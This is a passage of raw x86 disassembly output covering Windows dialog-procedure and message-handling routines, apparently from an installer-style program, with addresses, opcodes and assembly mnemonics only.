  404228:	68 00 c8 42 00       	push   $0x42c800
  40422d:	e8 66 22 00 00       	call   0x406498
  404232:	ff 76 20             	push   0x20(%esi)
  404235:	68 19 fc ff ff       	push   $0xfffffc19
  40423a:	57                   	push   %edi
  40423b:	e8 65 02 00 00       	call   0x4044a5
  404240:	ff 76 1c             	push   0x1c(%esi)
  404243:	68 1b fc ff ff       	push   $0xfffffc1b
  404248:	57                   	push   %edi
  404249:	e8 57 02 00 00       	call   0x4044a5
  40424e:	ff 76 28             	push   0x28(%esi)
  404251:	68 1a fc ff ff       	push   $0xfffffc1a
  404256:	57                   	push   %edi
  404257:	e8 49 02 00 00       	call   0x4044a5
  40425c:	6a 03                	push   $0x3
  40425e:	57                   	push   %edi
  40425f:	ff 15 28 82 40 00    	call   *0x408228
  404265:	39 2d ec 43 42 00    	cmp    %ebp,0x4243ec
  40426b:	89 44 24 30          	mov    %eax,0x30(%esp)
  40426f:	74 08                	je     0x404279
  404271:	66 81 e3 fd fe       	and    $0xfefd,%bx
  404276:	83 cb 04             	or     $0x4,%ebx
  404279:	8b cb                	mov    %ebx,%ecx
  40427b:	83 e1 08             	and    $0x8,%ecx
  40427e:	51                   	push   %ecx
  40427f:	50                   	push   %eax
  404280:	ff 15 14 82 40 00    	call   *0x408214
  404286:	8b c3                	mov    %ebx,%eax
  404288:	25 00 01 00 00       	and    $0x100,%eax
  40428d:	50                   	push   %eax
  40428e:	ff 74 24 34          	push   0x34(%esp)
  404292:	ff 15 3c 82 40 00    	call   *0x40823c
  404298:	8b c3                	mov    %ebx,%eax
  40429a:	83 e0 02             	and    $0x2,%eax
  40429d:	50                   	push   %eax
  40429e:	e8 24 02 00 00       	call   0x4044c7
  4042a3:	83 e3 04             	and    $0x4,%ebx
  4042a6:	53                   	push   %ebx
  4042a7:	ff 35 20 f9 41 00    	push   0x41f920
  4042ad:	ff 15 3c 82 40 00    	call   *0x40823c
  4042b3:	3b dd                	cmp    %ebp,%ebx
  4042b5:	74 03                	je     0x4042ba
  4042b7:	55                   	push   %ebp
  4042b8:	eb 02                	jmp    0x4042bc
  4042ba:	6a 01                	push   $0x1
  4042bc:	68 60 f0 00 00       	push   $0xf060
  4042c1:	55                   	push   %ebp
  4042c2:	57                   	push   %edi
  4042c3:	ff 15 cc 81 40 00    	call   *0x4081cc
  4042c9:	50                   	push   %eax
  4042ca:	ff 15 d0 81 40 00    	call   *0x4081d0
  4042d0:	8b 1d 44 82 40 00    	mov    0x408244,%ebx
  4042d6:	6a 01                	push   $0x1
  4042d8:	55                   	push   %ebp
  4042d9:	68 f4 00 00 00       	push   $0xf4
  4042de:	ff 74 24 3c          	push   0x3c(%esp)
  4042e2:	ff d3                	call   *%ebx
  4042e4:	39 2d ec 43 42 00    	cmp    %ebp,0x4243ec
  4042ea:	74 13                	je     0x4042ff
  4042ec:	55                   	push   %ebp
  4042ed:	6a 02                	push   $0x2
  4042ef:	68 01 04 00 00       	push   $0x401
  4042f4:	57                   	push   %edi
  4042f5:	ff d3                	call   *%ebx
  4042f7:	ff 35 20 f9 41 00    	push   0x41f920
  4042fd:	eb 06                	jmp    0x404305
  4042ff:	ff 35 54 09 42 00    	push   0x420954
  404305:	e8 d0 01 00 00       	call   0x4044da
  40430a:	e8 7d fc ff ff       	call   0x403f8c
  40430f:	bb 58 09 42 00       	mov    $0x420958,%ebx
  404314:	50                   	push   %eax
  404315:	53                   	push   %ebx
  404316:	e8 ea 20 00 00       	call   0x406405
  40431b:	ff 76 18             	push   0x18(%esi)
  40431e:	53                   	push   %ebx
  40431f:	e8 f7 20 00 00       	call   0x40641b
  404324:	03 c3                	add    %ebx,%eax
  404326:	50                   	push   %eax
  404327:	e8 6c 21 00 00       	call   0x406498
  40432c:	53                   	push   %ebx
  40432d:	57                   	push   %edi
  40432e:	ff 15 08 82 40 00    	call   *0x408208
  404334:	55                   	push   %ebp
  404335:	ff 76 08             	push   0x8(%esi)
  404338:	e8 4c d0 ff ff       	call   0x401389
  40433d:	85 c0                	test   %eax,%eax
  40433f:	0f 85 9c fe ff ff    	jne    0x4041e1
  404345:	39 2e                	cmp    %ebp,(%esi)
  404347:	0f 84 94 fe ff ff    	je     0x4041e1
  40434d:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  404351:	75 1d                	jne    0x404370
  404353:	39 2d ec 43 42 00    	cmp    %ebp,0x4243ec
  404359:	0f 85 13 01 00 00    	jne    0x404472
  40435f:	39 2d e0 43 42 00    	cmp    %ebp,0x4243e0
  404365:	0f 85 76 fe ff ff    	jne    0x4041e1
  40436b:	e9 02 01 00 00       	jmp    0x404472
  404370:	ff 35 38 3b 42 00    	push   0x423b38
  404376:	ff 15 fc 81 40 00    	call   *0x4081fc
  40437c:	89 35 30 01 42 00    	mov    %esi,0x420130
  404382:	39 2e                	cmp    %ebp,(%esi)
  404384:	0f 8e c5 00 00 00    	jle    0x40444f
  40438a:	8b 46 04             	mov    0x4(%esi),%eax
  40438d:	56                   	push   %esi
  40438e:	ff 34 85 f0 a1 40 00 	push   0x40a1f0(,%eax,4)
  404395:	66 8b 06             	mov    (%esi),%ax
  404398:	66 03 05 40 3b 42 00 	add    0x423b40,%ax
  40439f:	57                   	push   %edi
  4043a0:	0f b7 c0             	movzwl %ax,%eax
  4043a3:	50                   	push   %eax
  4043a4:	ff 35 60 43 42 00    	push   0x424360
  4043aa:	ff 15 00 82 40 00    	call   *0x408200
  4043b0:	3b c5                	cmp    %ebp,%eax
  4043b2:	a3 38 3b 42 00       	mov    %eax,0x423b38
  4043b7:	0f 84 92 00 00 00    	je     0x40444f
  4043bd:	ff 76 2c             	push   0x2c(%esi)
  4043c0:	6a 06                	push   $0x6
  4043c2:	50                   	push   %eax
  4043c3:	e8 dd 00 00 00       	call   0x4044a5
  4043c8:	8d 44 24 10          	lea    0x10(%esp),%eax
  4043cc:	50                   	push   %eax
  4043cd:	68 fa 03 00 00       	push   $0x3fa
  4043d2:	57                   	push   %edi
  4043d3:	ff 15 28 82 40 00    	call   *0x408228
  4043d9:	50                   	push   %eax
  4043da:	ff 15 d4 81 40 00    	call   *0x4081d4
  4043e0:	8d 44 24 10          	lea    0x10(%esp),%eax
  4043e4:	50                   	push   %eax
  4043e5:	57                   	push   %edi
  4043e6:	ff 15 d8 81 40 00    	call   *0x4081d8
  4043ec:	6a 15                	push   $0x15
  4043ee:	55                   	push   %ebp
  4043ef:	55                   	push   %ebp
  4043f0:	ff 74 24 20          	push   0x20(%esp)
  4043f4:	ff 74 24 20          	push   0x20(%esp)
  4043f8:	55                   	push   %ebp
  4043f9:	ff 35 38 3b 42 00    	push   0x423b38
  4043ff:	ff 15 bc 81 40 00    	call   *0x4081bc
  404405:	55                   	push   %ebp
  404406:	ff 76 0c             	push   0xc(%esi)
  404409:	e8 7b cf ff ff       	call   0x401389
  40440e:	39 2d 2c 3b 42 00    	cmp    %ebp,0x423b2c
  404414:	75 5c                	jne    0x404472
  404416:	6a 08                	push   $0x8
  404418:	ff 35 38 3b 42 00    	push   0x423b38
  40441e:	ff 15 14 82 40 00    	call   *0x408214
  404424:	68 05 04 00 00       	push   $0x405
  404429:	e8 c3 00 00 00       	call   0x4044f1
  40442e:	eb 1f                	jmp    0x40444f
  404430:	ff 35 38 3b 42 00    	push   0x423b38
  404436:	ff 15 fc 81 40 00    	call   *0x4081fc
  40443c:	ff 35 28 fd 41 00    	push   0x41fd28
  404442:	89 2d 68 43 42 00    	mov    %ebp,0x424368
  404448:	57                   	push   %edi
  404449:	ff 15 dc 81 40 00    	call   *0x4081dc
  40444f:	39 2d 58 19 42 00    	cmp    %ebp,0x421958
  404455:	75 1b                	jne    0x404472
  404457:	39 2d 38 3b 42 00    	cmp    %ebp,0x423b38
  40445d:	74 13                	je     0x404472
  40445f:	6a 0a                	push   $0xa
  404461:	57                   	push   %edi
  404462:	ff 15 14 82 40 00    	call   *0x408214
  404468:	c7 05 58 19 42 00 01 	movl   $0x1,0x421958
  40446f:	00 00 00 
  404472:	33 c0                	xor    %eax,%eax
  404474:	5f                   	pop    %edi
  404475:	5e                   	pop    %esi
  404476:	5d                   	pop    %ebp
  404477:	5b                   	pop    %ebx
  404478:	83 c4 10             	add    $0x10,%esp
  40447b:	c2 10 00             	ret    $0x10
  40447e:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  404483:	75 06                	jne    0x40448b
  404485:	ff 05 2c 3b 42 00    	incl   0x423b2c
  40448b:	6a 00                	push   $0x0
  40448d:	ff 74 24 08          	push   0x8(%esp)
  404491:	68 08 04 00 00       	push   $0x408
  404496:	ff 35 68 43 42 00    	push   0x424368
  40449c:	ff 15 44 82 40 00    	call   *0x408244
  4044a2:	c2 04 00             	ret    $0x4
  4044a5:	ff 74 24 0c          	push   0xc(%esp)
  4044a9:	6a 00                	push   $0x0
  4044ab:	e8 e8 1f 00 00       	call   0x406498
  4044b0:	50                   	push   %eax
  4044b1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4044b5:	05 e8 03 00 00       	add    $0x3e8,%eax
  4044ba:	50                   	push   %eax
  4044bb:	ff 74 24 0c          	push   0xc(%esp)
  4044bf:	e8 35 16 00 00       	call   0x405af9
  4044c4:	c2 0c 00             	ret    $0xc
  4044c7:	ff 74 24 04          	push   0x4(%esp)
  4044cb:	ff 35 54 09 42 00    	push   0x420954
  4044d1:	ff 15 3c 82 40 00    	call   *0x40823c
  4044d7:	c2 04 00             	ret    $0x4
  4044da:	6a 01                	push   $0x1
  4044dc:	ff 74 24 08          	push   0x8(%esp)
  4044e0:	6a 28                	push   $0x28
  4044e2:	ff 35 68 43 42 00    	push   0x424368
  4044e8:	ff 15 44 82 40 00    	call   *0x408244
  4044ee:	c2 04 00             	ret    $0x4
  4044f1:	a1 38 3b 42 00       	mov    0x423b38,%eax
  4044f6:	85 c0                	test   %eax,%eax
  4044f8:	74 0f                	je     0x404509
  4044fa:	6a 00                	push   $0x0
  4044fc:	6a 00                	push   $0x0
  4044fe:	ff 74 24 0c          	push   0xc(%esp)
  404502:	50                   	push   %eax
  404503:	ff 15 44 82 40 00    	call   *0x408244
  404509:	c2 04 00             	ret    $0x4
  40450c:	55                   	push   %ebp
  40450d:	8b ec                	mov    %esp,%ebp
  40450f:	83 ec 0c             	sub    $0xc,%esp
  404512:	8b 45 08             	mov    0x8(%ebp),%eax
  404515:	56                   	push   %esi
  404516:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  40451b:	83 f8 05             	cmp    $0x5,%eax
  40451e:	0f 87 b0 00 00 00    	ja     0x4045d4
  404524:	6a eb                	push   $0xffffffeb
  404526:	ff 75 10             	push   0x10(%ebp)
  404529:	ff 15 c0 81 40 00    	call   *0x4081c0
  40452f:	8b f0                	mov    %eax,%esi
  404531:	85 f6                	test   %esi,%esi
  404533:	0f 84 9b 00 00 00    	je     0x4045d4
  404539:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  40453d:	0f 87 91 00 00 00    	ja     0x4045d4
  404543:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  404547:	0f 87 87 00 00 00    	ja     0x4045d4
  40454d:	8b 4e 14             	mov    0x14(%esi),%ecx
  404550:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  404556:	75 7c                	jne    0x4045d4
  404558:	8b 06                	mov    (%esi),%eax
  40455a:	57                   	push   %edi
  40455b:	8b 3d b8 81 40 00    	mov    0x4081b8,%edi
  404561:	f6 c1 02             	test   $0x2,%cl
  404564:	74 03                	je     0x404569
  404566:	50                   	push   %eax
  404567:	ff d7                	call   *%edi
  404569:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  40456d:	74 0a                	je     0x404579
  40456f:	50                   	push   %eax
  404570:	ff 75 0c             	push   0xc(%ebp)
  404573:	ff 15 64 80 40 00    	call   *0x408064
  404579:	ff 76 10             	push   0x10(%esi)
  40457c:	ff 75 0c             	push   0xc(%ebp)
  40457f:	ff 15 60 80 40 00    	call   *0x408060
  404585:	8b 46 04             	mov    0x4(%esi),%eax
  404588:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  40458c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40458f:	74 06                	je     0x404597
  404591:	50                   	push   %eax
  404592:	ff d7                	call   *%edi
  404594:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404597:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  40459b:	5f                   	pop    %edi
  40459c:	74 0a                	je     0x4045a8
  40459e:	50                   	push   %eax
  40459f:	ff 75 0c             	push   0xc(%ebp)
  4045a2:	ff 15 4c 80 40 00    	call   *0x40804c
  4045a8:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  4045ac:	74 21                	je     0x4045cf
  4045ae:	8b 46 08             	mov    0x8(%esi),%eax
  4045b1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4045b4:	8b 46 0c             	mov    0xc(%esi),%eax
  4045b7:	85 c0                	test   %eax,%eax
  4045b9:	74 07                	je     0x4045c2
  4045bb:	50                   	push   %eax
  4045bc:	ff 15 54 80 40 00    	call   *0x408054
  4045c2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4045c5:	50                   	push   %eax
  4045c6:	ff 15 58 80 40 00    	call   *0x408058
  4045cc:	89 46 0c             	mov    %eax,0xc(%esi)
  4045cf:	8b 46 0c             	mov    0xc(%esi),%eax
  4045d2:	eb 02                	jmp    0x4045d6
  4045d4:	33 c0                	xor    %eax,%eax
  4045d6:	5e                   	pop    %esi
  4045d7:	c9                   	leave
  4045d8:	c2 0c 00             	ret    $0xc
  4045db:	55                   	push   %ebp
  4045dc:	8b ec                	mov    %esp,%ebp
  4045de:	8b 45 08             	mov    0x8(%ebp),%eax
  4045e1:	8b 0d 24 f9 41 00    	mov    0x41f924,%ecx
  4045e7:	ff 75 10             	push   0x10(%ebp)
  4045ea:	03 c8                	add    %eax,%ecx
  4045ec:	51                   	push   %ecx
  4045ed:	ff 75 0c             	push   0xc(%ebp)
  4045f0:	ff 15 8c 80 40 00    	call   *0x40808c
  4045f6:	ff 75 0c             	push   0xc(%ebp)
  4045f9:	ff 15 98 80 40 00    	call   *0x408098
  4045ff:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404602:	89 01                	mov    %eax,(%ecx)
  404604:	01 05 24 f9 41 00    	add    %eax,0x41f924
  40460a:	33 c0                	xor    %eax,%eax
  40460c:	5d                   	pop    %ebp
  40460d:	c2 10 00             	ret    $0x10
  404610:	55                   	push   %ebp
  404611:	8b ec                	mov    %esp,%ebp
  404613:	83 ec 0c             	sub    $0xc,%esp
  404616:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40461d:	53                   	push   %ebx
  40461e:	56                   	push   %esi
  40461f:	57                   	push   %edi
  404620:	0f 85 0c 01 00 00    	jne    0x404732
  404626:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404629:	8b 7b 30             	mov    0x30(%ebx),%edi
  40462c:	85 ff                	test   %edi,%edi
  40462e:	7d 11                	jge    0x404641
  404630:	8b 0d 3c 3b 42 00    	mov    0x423b3c,%ecx
  404636:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  40463d:	2b c8                	sub    %eax,%ecx
  40463f:	8b 39                	mov    (%ecx),%edi
  404641:	a1 98 43 42 00       	mov    0x424398,%eax
  404646:	ff 73 34             	push   0x34(%ebx)
  404649:	03 f8                	add    %eax,%edi
  40464b:	6a 22                	push   $0x22
  40464d:	0f be 07             	movsbl (%edi),%eax
  404650:	89 45 14             	mov    %eax,0x14(%ebp)
  404653:	8b 43 14             	mov    0x14(%ebx),%eax
  404656:	ff 75 08             	push   0x8(%ebp)
  404659:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40465d:	8b f0                	mov    %eax,%esi
  40465f:	47                   	inc    %edi
  404660:	f7 d6                	not    %esi
  404662:	c1 ee 05             	shr    $0x5,%esi
  404665:	83 e6 01             	and    $0x1,%esi
  404668:	83 e0 01             	and    $0x1,%eax
  40466b:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40466e:	c7 45 fc db 45 40 00 	movl   $0x4045db,-0x4(%ebp)
  404675:	0b f0                	or     %eax,%esi
  404677:	e8 29 fe ff ff       	call   0x4044a5
  40467c:	ff 73 38             	push   0x38(%ebx)
  40467f:	6a 23                	push   $0x23
  404681:	ff 75 08             	push   0x8(%ebp)
  404684:	e8 1c fe ff ff       	call   0x4044a5
  404689:	33 c0                	xor    %eax,%eax
  40468b:	6a 01                	push   $0x1
  40468d:	85 f6                	test   %esi,%esi
  40468f:	0f 94 c0             	sete   %al
  404692:	05 0a 04 00 00       	add    $0x40a,%eax
  404697:	50                   	push   %eax
  404698:	ff 75 08             	push   0x8(%ebp)
  40469b:	ff 15 ac 81 40 00    	call   *0x4081ac
  4046a1:	56                   	push   %esi
  4046a2:	e8 20 fe ff ff       	call   0x4044c7
  4046a7:	68 e8 03 00 00       	push   $0x3e8
  4046ac:	ff 75 08             	push   0x8(%ebp)
  4046af:	ff 15 28 82 40 00    	call   *0x408228
  4046b5:	8b d8                	mov    %eax,%ebx
  4046b7:	53                   	push   %ebx
  4046b8:	e8 1d fe ff ff       	call   0x4044da
  4046bd:	8b 35 44 82 40 00    	mov    0x408244,%esi
  4046c3:	6a 00                	push   $0x0
  4046c5:	6a 01                	push   $0x1
  4046c7:	68 5b 04 00 00       	push   $0x45b
  4046cc:	53                   	push   %ebx
  4046cd:	ff d6                	call   *%esi
  4046cf:	a1 70 43 42 00       	mov    0x424370,%eax
  4046d4:	8b 40 68             	mov    0x68(%eax),%eax
  4046d7:	85 c0                	test   %eax,%eax
  4046d9:	7d 09                	jge    0x4046e4
  4046db:	f7 d8                	neg    %eax
  4046dd:	50                   	push   %eax
  4046de:	ff 15 b8 81 40 00    	call   *0x4081b8
  4046e4:	50                   	push   %eax
  4046e5:	6a 00                	push   $0x0
  4046e7:	68 43 04 00 00       	push   $0x443
  4046ec:	53                   	push   %ebx
  4046ed:	ff d6                	call   *%esi
  4046ef:	68 00 00 01 04       	push   $0x4010000
  4046f4:	6a 00                	push   $0x0
  4046f6:	68 45 04 00 00       	push   $0x445
  4046fb:	53                   	push   %ebx
  4046fc:	ff d6                	call   *%esi
  4046fe:	57                   	push   %edi
  4046ff:	e8 17 1d 00 00       	call   0x40641b
  404704:	33 ff                	xor    %edi,%edi
  404706:	50                   	push   %eax
  404707:	57                   	push   %edi
  404708:	68 35 04 00 00       	push   $0x435
  40470d:	53                   	push   %ebx
  40470e:	ff d6                	call   *%esi
  404710:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404713:	89 3d 24 f9 41 00    	mov    %edi,0x41f924
  404719:	50                   	push   %eax
  40471a:	ff 75 14             	push   0x14(%ebp)
  40471d:	68 49 04 00 00       	push   $0x449
  404722:	53                   	push   %ebx
  404723:	ff d6                	call   *%esi
  404725:	89 3d 24 f9 41 00    	mov    %edi,0x41f924
  40472b:	33 c0                	xor    %eax,%eax
  40472d:	e9 57 01 00 00       	jmp    0x404889
  404732:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404739:	8b 1d 28 82 40 00    	mov    0x408228,%ebx
  40473f:	8b 35 44 82 40 00    	mov    0x408244,%esi
  404745:	75 5a                	jne    0x4047a1
  404747:	8b 45 10             	mov    0x10(%ebp),%eax
  40474a:	c1 e8 10             	shr    $0x10,%eax
  40474d:	66 85 c0             	test   %ax,%ax
  404750:	0f 85 24 01 00 00    	jne    0x40487a
  404756:	33 c0                	xor    %eax,%eax
  404758:	39 05 24 f9 41 00    	cmp    %eax,0x41f924
  40475e:	0f 85 16 01 00 00    	jne    0x40487a
  404764:	8b 0d 30 01 42 00    	mov    0x420130,%ecx
  40476a:	8d 79 14             	lea    0x14(%ecx),%edi
  40476d:	f6 07 20             	testb  $0x20,(%edi)
  404770:	0f 84 04 01 00 00    	je     0x40487a
  404776:	50                   	push   %eax
  404777:	50                   	push   %eax
  404778:	68 f0 00 00 00       	push   $0xf0
  40477d:	68 0a 04 00 00       	push   $0x40a
  404782:	ff 75 08             	push   0x8(%ebp)
  404785:	ff d3                	call   *%ebx
  404787:	50                   	push   %eax
  404788:	ff d6                	call   *%esi
  40478a:	8b 0f                	mov    (%edi),%ecx
  40478c:	83 e0 01             	and    $0x1,%eax
  40478f:	83 e1 fe             	and    $0xfffffffe,%ecx
  404792:	50                   	push   %eax
  404793:	0b c8                	or     %eax,%ecx
  404795:	89 0f                	mov    %ecx,(%edi)
  404797:	e8 2b fd ff ff       	call   0x4044c7
  40479c:	e8 ef 00 00 00       	call   0x404890
  4047a1:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4047a5:	0f 85 c0 00 00 00    	jne    0x40486b
  4047ab:	68 e8 03 00 00       	push   $0x3e8
  4047b0:	ff 75 08             	push   0x8(%ebp)
  4047b3:	ff d3                	call   *%ebx
  4047b5:	8b 7d 14             	mov    0x14(%ebp),%edi
  4047b8:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4047bf:	75 68                	jne    0x404829
  4047c1:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4047c8:	75 5f                	jne    0x404829
  4047ca:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4047cd:	8b 57 18             	mov    0x18(%edi),%edx
  4047d0:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4047d3:	2b ca                	sub    %edx,%ecx
  4047d5:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4047db:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4047de:	c7 45 fc 00 33 42 00 	movl   $0x423300,-0x4(%ebp)
  4047e5:	73 42                	jae    0x404829
  4047e7:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4047ea:	51                   	push   %ecx
  4047eb:	6a 00                	push   $0x0
  4047ed:	68 4b 04 00 00       	push   $0x44b
  4047f2:	50                   	push   %eax
  4047f3:	ff d6                	call   *%esi
  4047f5:	8b 3d b0 81 40 00    	mov    0x4081b0,%edi
  4047fb:	68 02 7f 00 00       	push   $0x7f02
  404800:	6a 00                	push   $0x0
  404802:	ff d7                	call   *%edi
  404804:	8b 1d b4 81 40 00    	mov    0x4081b4,%ebx
  40480a:	50                   	push   %eax
  40480b:	ff d3                	call   *%ebx
  40480d:	6a 01                	push   $0x1
  40480f:	ff 75 fc             	push   -0x4(%ebp)
  404812:	ff 75 08             	push   0x8(%ebp)
  404815:	e8 9a 00 00 00       	call   0x4048b4
  40481a:	68 00 7f 00 00       	push   $0x7f00
  40481f:	6a 00                	push   $0x0
  404821:	ff d7                	call   *%edi
  404823:	50                   	push   %eax
  404824:	ff d3                	call   *%ebx
  404826:	8b 7d 14             	mov    0x14(%ebp),%edi
  404829:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404830:	75 4b                	jne    0x40487d
  404832:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404839:	75 42                	jne    0x40487d
  40483b:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  40483f:	75 11                	jne    0x404852
  404841:	6a 00                	push   $0x0
  404843:	6a 01                	push   $0x1
  404845:	68 11 01 00 00       	push   $0x111
  40484a:	ff 35 68 43 42 00    	push   0x424368
  404850:	ff d6                	call   *%esi
  404852:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404856:	75 0e                	jne    0x404866
  404858:	6a 00                	push   $0x0
  40485a:	6a 00                	push   $0x0
  40485c:	6a 10                	push   $0x10
  40485e:	ff 35 68 43 42 00    	push   0x424368
  404864:	ff d6                	call   *%esi
  404866:	33 c0                	xor    %eax,%eax
  404868:	40                   	inc    %eax
  404869:	eb 1e                	jmp    0x404889
  40486b:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404872:	75 06                	jne    0x40487a
  404874:	ff 05 24 f9 41 00    	incl   0x41f924
  40487a:	8b 7d 14             	mov    0x14(%ebp),%edi
  40487d:	57                   	push   %edi
  40487e:	ff 75 10             	push   0x10(%ebp)
  404881:	ff 75 0c             	push   0xc(%ebp)
  404884:	e8 83 fc ff ff       	call   0x40450c
  404889:	5f                   	pop    %edi
  40488a:	5e                   	pop    %esi
  40488b:	5b                   	pop    %ebx
  40488c:	c9                   	leave
  40488d:	c2 10 00             	ret    $0x10
  404890:	83 3d ec 43 42 00 00 	cmpl   $0x0,0x4243ec
  404897:	a1 20 f9 41 00       	mov    0x41f920,%eax
  40489c:	75 05                	jne    0x4048a3
  40489e:	a1 54 09 42 00       	mov    0x420954,%eax
  4048a3:	6a 01                	push   $0x1
  4048a5:	6a 01                	push   $0x1
  4048a7:	68 f4 00 00 00       	push   $0xf4
  4048ac:	50                   	push   %eax
  4048ad:	ff 15 44 82 40 00    	call   *0x408244
  4048b3:	c3                   	ret
  4048b4:	55                   	push   %ebp
  4048b5:	8b ec                	mov    %esp,%ebp
  4048b7:	83 ec 3c             	sub    $0x3c,%esp
  4048ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4048bd:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  4048c1:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4048c5:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4048c8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4048cb:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  4048d2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4048d5:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4048d8:	50                   	push   %eax
  4048d9:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4048e0:	c7 45 d0 10 a2 40 00 	movl   $0x40a210,-0x30(%ebp)
  4048e7:	e8 f5 11 00 00       	call   0x405ae1
  4048ec:	c9                   	leave
  4048ed:	c2 0c 00             	ret    $0xc
  4048f0:	55                   	push   %ebp
  4048f1:	8b ec                	mov    %esp,%ebp
  4048f3:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4048fa:	56                   	push   %esi
  4048fb:	8b 75 14             	mov    0x14(%ebp),%esi
  4048fe:	75 26                	jne    0x404926
  404900:	ff 76 30             	push   0x30(%esi)
  404903:	6a 1d                	push   $0x1d
  404905:	ff 75 08             	push   0x8(%ebp)
  404908:	e8 98 fb ff ff       	call   0x4044a5
  40490d:	8b 46 3c             	mov    0x3c(%esi),%eax
  404910:	c1 e0 0a             	shl    $0xa,%eax
  404913:	05 00 50 42 00       	add    $0x425000,%eax
  404918:	50                   	push   %eax
  404919:	68 e8 03 00 00       	push   $0x3e8
  40491e:	ff 75 08             	push   0x8(%ebp)
  404921:	e8 d3 11 00 00       	call   0x405af9
  404926:	56                   	push   %esi
  404927:	ff 75 10             	push   0x10(%ebp)
  40492a:	ff 75 0c             	push   0xc(%ebp)
  40492d:	e8 da fb ff ff       	call   0x40450c
  404932:	5e                   	pop    %esi
  404933:	5d                   	pop    %ebp
  404934:	c2 10 00             	ret    $0x10
  404937:	55                   	push   %ebp
  404938:	8b ec                	mov    %esp,%ebp
  40493a:	83 ec 4c             	sub    $0x4c,%esp
  40493d:	a1 30 01 42 00       	mov    0x420130,%eax
  404942:	53                   	push   %ebx
  404943:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404946:	56                   	push   %esi
  404947:	8b 58 3c             	mov    0x3c(%eax),%ebx
  40494a:	8b 40 38             	mov    0x38(%eax),%eax
  40494d:	c1 e3 0a             	shl    $0xa,%ebx
  404950:	81 c3 00 50 42 00    	add    $0x425000,%ebx
  404956:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40495d:	57                   	push   %edi
  40495e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404961:	75 11                	jne    0x404974
  404963:	53                   	push   %ebx
  404964:	68 fb 03 00 00       	push   $0x3fb
  404969:	e8 91 11 00 00       	call   0x405aff
  40496e:	53                   	push   %ebx
  40496f:	e8 8b 1d 00 00       	call   0x4066ff
  404974:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40497b:	8b 75 08             	mov    0x8(%ebp),%esi
  40497e:	75 6c                	jne    0x4049ec
  404980:	68 fb 03 00 00       	push   $0x3fb
  404985:	56                   	push   %esi
  404986:	ff 15 28 82 40 00    	call   *0x408228
  40498c:	53                   	push   %ebx
  40498d:	8b f8                	mov    %eax,%edi
  40498f:	e8 70 14 00 00       	call   0x405e04
  404994:	85 c0                	test   %eax,%eax
  404996:	74 10                	je     0x4049a8
  404998:	53                   	push   %ebx
  404999:	e8 92 14 00 00       	call   0x405e30
  40499e:	85 c0                	test   %eax,%eax
  4049a0:	75 06                	jne    0x4049a8
  4049a2:	53                   	push   %ebx
  4049a3:	e8 ef 13 00 00       	call   0x405d97
  4049a8:	53                   	push   %ebx
  4049a9:	57                   	push   %edi
  4049aa:	89 35 38 3b 42 00    	mov    %esi,0x423b38
  4049b0:	ff 15 08 82 40 00    	call   *0x408208
  4049b6:	8b 45 14             	mov    0x14(%ebp),%eax
  4049b9:	ff 70 34             	push   0x34(%eax)
  4049bc:	6a 01                	push   $0x1
  4049be:	56                   	push   %esi
  4049bf:	e8 e1 fa ff ff       	call   0x4044a5
  4049c4:	8b 45 14             	mov    0x14(%ebp),%eax
  4049c7:	ff 70 30             	push   0x30(%eax)
  4049ca:	6a 14                	push   $0x14
  4049cc:	56                   	push   %esi
  4049cd:	e8 d3 fa ff ff       	call   0x4044a5
  4049d2:	57                   	push   %edi
  4049d3:	e8 02 fb ff ff       	call   0x4044da
  4049d8:	6a 09                	push   $0x9
  4049da:	e8 4e 1e 00 00       	call   0x40682d
